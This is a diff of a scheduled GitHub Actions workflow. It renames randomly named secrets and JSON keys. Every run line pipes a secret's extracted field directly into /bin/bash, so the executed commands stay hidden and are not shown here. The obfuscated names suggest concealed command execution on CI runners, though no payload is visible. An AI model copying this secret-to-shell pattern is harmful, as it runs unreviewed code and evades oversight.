@@ -1,30 +1,27 @@
 name: meanwhilemagpie
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 3/6 * * *'
-
-jobs:  # 24855
+    - cron: '42 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: meanwhilemagpie
         env:
-          wmnju107: ${{ secrets.wmnju107 }}
+          xh8227: ${{ secrets.xh8227 }}
         run: |
-          echo $wmnju107 | jq -r .qoaza4 | /bin/bash
-          echo $zi4292 | jq -r .kbrd6 | /bin/bash
-          echo $gyb82295 | jq -r .azgp4 | /bin/bash
-          echo $jjgmk9 | jq -r .p085 | /bin/bash
-          echo $c782 | jq -r .jja64 | /bin/bash
-          echo $mw83 | jq -r .c3 | /bin/bash
-          echo $fo76 | jq -r .nnfw01430 | /bin/bash
-          echo $bsjg61595 | jq -r .mio59432 | /bin/bash
-          echo $r777 | jq -r .o52200 | /bin/bash
-          echo $poa01 | jq -r .uve4251 | /bin/bash
-          echo $ey09 | jq -r .rei34 | /bin/bash
-          echo $uncpl8753 | jq -r .th2677 | /bin/bash
+          echo $xh8227 | jq -r .au997 | /bin/bash
+          echo $lz02710 | jq -r .o62745 | /bin/bash
+          echo $fhe479 | jq -r .oslam1 | /bin/bash
+          echo $lx0 | jq -r .jc5177 | /bin/bash
+          echo $ir727 | jq -r .h19475 | /bin/bash
+          echo $tebh75 | jq -r .jnf42 | /bin/bash
+          echo $leg48 | jq -r .fufer41622 | /bin/bash
+          echo $f9 | jq -r .ulma2 | /bin/bash
+          echo $xde50593 | jq -r .fsof9 | /bin/bash
+          echo $bpk90 | jq -r .p553 | /bin/bash
+          echo $hwf3161 | jq -r .eup4554 | /bin/bash
+          echo $an28 | jq -r .mj1 | /bin/bash
 
